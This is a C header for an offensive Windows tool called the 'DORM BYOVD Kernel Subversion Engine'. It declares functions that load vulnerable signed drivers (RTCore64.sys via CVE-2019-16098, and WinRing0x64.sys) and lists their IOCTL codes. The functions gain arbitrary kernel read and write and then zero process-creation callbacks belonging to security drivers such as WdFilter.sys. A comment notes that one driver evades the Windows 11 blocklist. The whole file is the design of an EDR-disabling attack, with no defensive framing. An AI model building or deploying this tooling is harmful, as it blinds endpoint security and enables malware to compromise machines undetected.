/*
 * byovd.h — DORM Phase 14: BYOVD Kernel Subversion Engine
 * byovd/kernel_subverter/byovd.h
 *
 * Windows x64 | MinGW/Clang | ring-3 loader + ring-0 R/W primitive
 *
 * Two interchangeable backends — same header, different .c:
 *
 *   byovd.c              RTCore64.sys (CVE-2019-16098)
 *                          IOCTL read:  0x80002048
 *                          IOCTL write: 0x8000204C
 *                          Address type: kernel VA (direct)
 *                          Device: \\.\RTCore64
 *
 *   byovd_winring0x64.c  WinRing0x64.sys (LibreHardwareMonitor build)
 *                          IOCTL read:  0x9C402104  (IOCTL_OLS_READ_MEMORY)
 *                          IOCTL write: 0x9C402108  (IOCTL_OLS_WRITE_MEMORY)
 *                          Address type: PHYSICAL — VA→PA layer required
 *                          Device: \\.\WinRing0_1_2_0
 *                          NOT on Windows 11 CI.dll compiled-in blocklist.
 *
 * Usage pattern (WinRing0 backend):
 *   1. byovd_load(path_to_WinRing0x64_sys)   create service + start driver
 *   2. byovd_open()                           open device handle
 *   3. byovd_find_ntoskrnl_phys(kernel_base)  VA→PA translation init  ← NEW
 *   4. byovd_read8 / byovd_write8             arbitrary kernel R/W (VA)
 *   5. dorm_remove_process_callbacks()        patch notify array
 *   6. byovd_unload()                         stop service + delete
 *
 * Usage pattern (RTCore64 backend):
 *   Steps 1-2, skip 3, then 4-6.  RTCore64 takes VAs directly.
 *
 * Link: -lkernel32 -ladvapi32
 */
#pragma once
#include <windows.h>

/* ── driver lifecycle ──────────────────────────────────────── */

/*
 * byovd_load — create SCM service and start the vulnerable driver.
 * driver_path: absolute or relative path to the .sys file.
 */
BOOL byovd_load(const char *driver_path);

/*
 * byovd_open — open the device handle after byovd_load().
 * Must succeed before any R/W calls.
 */
BOOL byovd_open(void);

/* byovd_close — close the device handle (called by byovd_unload). */
void byovd_close(void);

/*
 * byovd_unload — stop + delete the SCM service.
 * Also resets internal VA→PA state (WinRing0 backend).
 */
BOOL byovd_unload(void);

/* ── VA→PA translation (WinRing0 backend only) ─────────────── */

/*
 * byovd_find_ntoskrnl_phys — scan physical RAM for ntoskrnl PE header.
 *
 * WinRing0x64 IOCTLs take PHYSICAL addresses. This function establishes
 * the VA→PA delta by scanning physical memory from 1 MB to 4 GB in
 * 2 MB steps, matching the PE ImageBase to ntoskrnl_va_base.
 *
 * MUST be called once after byovd_open() and before any byovd_read8/
 * write8 call when using the WinRing0 backend. The RTCore64 backend
 * does not need this (it translates internally in the driver).
 *
 * ntoskrnl_va_base: value from byovd_get_kernel_base().
 * Returns physical base address on success, 0 on failure.
 *
 * Internal effect: sets g_ntoskrnl_pa_base used by va_to_pa_delta().
 * Also triggers init_cr3() lazily on first pool-address access.
 */
ULONG64 byovd_find_ntoskrnl_phys(ULONG64 ntoskrnl_va_base);

/* ── kernel R/W primitive ──────────────────────────────────── */

/*
 * byovd_read4 / byovd_write4 — 4-byte kernel memory R/W.
 *
 * RTCore64 backend:  addr = kernel VA, passed directly to IOCTL.
 * WinRing0 backend:  addr = kernel VA, translated to PA via va_to_pa()
 *                    before the physical IOCTL. Requires prior call to
 *                    byovd_find_ntoskrnl_phys() for ntoskrnl-range VAs,
 *                    or relies on CR3 page-walk for pool VAs.
 */
BOOL byovd_read4 (ULONG64 kernel_va, ULONG  *value_out);
BOOL byovd_write4(ULONG64 kernel_va, ULONG   value);

/*
 * byovd_read8 / byovd_write8 — 8-byte kernel R/W via two 4-byte ops.
 * Little-endian recombination. va+4 is translated independently
 * (handles 4 KB page boundary crossing between lo and hi halves).
 */
BOOL byovd_read8 (ULONG64 kernel_va, ULONG64 *value_out);
BOOL byovd_write8(ULONG64 kernel_va, ULONG64  value);

/* ── kernel introspection helpers ──────────────────────────── */

/*
 * byovd_get_kernel_base — resolve ntoskrnl.exe load address via
 * NtQuerySystemInformation(SystemModuleInformation = 11).
 * Module[0] is always ntoskrnl on a live system.
 * Returns 0 on failure.
 */
ULONG64 byovd_get_kernel_base(void);

/*
 * byovd_resolve_export — find VA of an ntoskrnl export by name.
 *
 * Maps ntoskrnl from disk (resolves \\SystemRoot\\ path automatically),
 * walks the PE export directory, then applies the kernel-vs-disk base
 * delta to return a live kernel VA.
 *
 * Used to locate PsSetCreateProcessNotifyRoutine, whose body is then
 * scanned for a LEA RCX/RDX,[RIP+disp32] referencing the callback array.
 *
 * Returns 0 on failure.
 */
ULONG64 byovd_resolve_export(ULONG64 kernel_base, const char *export_name);
/* add this line to byovd.h after byovd_resolve_export */
ULONG64 byovd_find_ntoskrnl_phys(ULONG64 ntoskrnl_va_base);

/* ── callback removal ──────────────────────────────────────── */

/*
 * dorm_enum_process_callbacks — enumerate PspCreateProcessNotifyRoutine
 * array (dry run, no removal). Equivalent to dorm_remove_process_callbacks
 * with a NULL blacklist.
 *
 * output_path: file path for JSON output, or "-" / NULL for stdout.
 * Returns callback count found, -1 on failure.
 */
int dorm_enum_process_callbacks(const char *output_path);

/*
 * dorm_remove_process_callbacks — zero PspCreateProcessNotifyRoutine
 * entries whose owning module basename matches any entry in
 * module_blacklist[].
 *
 * blacklist:        array of module basenames to remove (e.g. "WdFilter.sys")
 * blacklist_count:  length of blacklist array
 * output_path:      JSON output path ("-" or NULL = stdout)
 *
 * Pass NULL blacklist for dry-run enumeration only.
 * Returns entries found (not removed count), -1 on fatal error.
 */
int dorm_remove_process_callbacks(const char **module_blacklist,
                                   int          blacklist_count,
                                   const char  *output_path);